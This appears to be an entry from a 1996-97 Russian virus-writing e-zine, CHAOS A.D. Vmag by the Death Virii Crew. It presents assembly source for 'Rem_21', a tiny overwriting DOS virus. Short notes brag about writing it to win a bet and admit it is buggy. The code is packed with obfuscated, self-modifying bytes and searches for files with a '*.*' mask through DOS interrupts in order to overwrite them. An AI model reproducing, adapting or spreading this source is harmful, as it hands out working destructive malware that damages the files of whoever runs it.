comment {
                                WAS
[Death Virii Crew] Presents
CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997

                              Rem_22

 Сей маленький оверврайтер был написан под пагубным влиянием пьяных
споров с известным крекером и хакером SkullC0DEr'ом. Спор был выигран
мной, как достойным представителем своего увлечения - вирмейкерства.

                                              (c) by Reminder [DVC]

                                NOW

                              Rem_21

 Hа один байт меньше, на один глюк больше. Hе всегда работает.

                                              (c) 2b


{
.model tiny             ; (c) 2b
.code
.startup
start:
    db    10Ch shr 1    ;xchg cl,[bp+xx]  <= повезет/не повезет?
    db    4eh
    db    9eh  shr 1
    db    3ch           ;cmp al,xx
    db    100h shr 1
    db    40h           ;inc ax
hel:    lodsw
    cwd
    mov    dl,al
    shl    dx,1
fmask    db    '*.*',0
    int    21h
    xchg    ax,bx
    jmp    hel

end